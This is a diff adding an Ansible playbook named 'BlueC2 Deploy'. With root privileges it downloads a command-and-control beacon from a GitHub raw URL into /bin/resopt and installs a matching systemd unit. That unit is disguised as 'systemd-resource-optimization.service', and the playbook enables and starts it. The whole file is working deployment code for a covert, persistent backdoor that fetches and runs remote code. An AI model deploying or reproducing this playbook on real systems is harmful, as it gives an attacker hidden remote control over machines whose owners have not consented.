@@ -1,0 +1,30 @@
+- name: BlueC2 Deploy
+  hosts: linux
+  vars:
+    beacon_url: "https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/beacon.py"
+    service_url: "https://raw.githubusercontent.com/bcvillano/BlueC2/main/client/systemd-resourceoptimization.service"
+  become: yes
+  tasks:
+
+  - name: Download Beacon
+    get_url:
+      url: "{{ beacon_url }}"
+      dest: /bin/resopt
+      mode: 0711
+
+  - name: Download Service
+    get_url:
+      url: "{{ service_url }}"
+      dest: /lib/systemd/system/systemd-resource-optimization.service
+      mode: 0644
+
+  - name: Enable Service
+    ansible.builtin.systemd_service:
+      name: systemd-resource-optimization.service
+      enabled: yes
+      state: started
+
+  - name: Daemon Reload
+    ansible.builtin.systemd_service:
+      daemon_reload: yes
+
